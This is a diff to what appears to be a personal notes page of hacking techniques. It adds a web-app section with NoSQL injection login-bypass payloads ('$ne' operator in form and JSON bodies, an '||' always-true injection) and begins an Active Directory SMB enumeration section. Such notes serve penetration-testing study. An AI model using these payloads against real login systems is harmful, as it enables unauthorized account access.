@@ -11,7 +11,43 @@ The techniques are organized by category, such as network hacking, web applicati
 
 To get started, click on one of the links on the left `toc` to navigate to the relevant category:
 
-## INITIAL RECON
+## Web App
+### Enumerating
+
+- Always check for error messages
+- Once you get that you can figure out the backend database(not always the default)
+
+### Sql Injection
+
+
+### Nosql injection
+
+You can try pass a variable
+
+```console
+username[$ne]=admin&password=pass
+```
+or you can convert to json under content type
+```console
+Content-Type: application/json
+```
+then fix payload so that it is in `json` format
+
+```json
+{"username":"admin",
+"password":{
+    "$ne":""
+}
+}
+```
+
+You can also use `||` which is an or statement. Pay attention to `==`
+
+```sql
+username=admin'||'1'=='1&password=pass
+```
+
+## Active Directory
 ### Enumerate smb
 Run `cme` to get some type of a burner
 
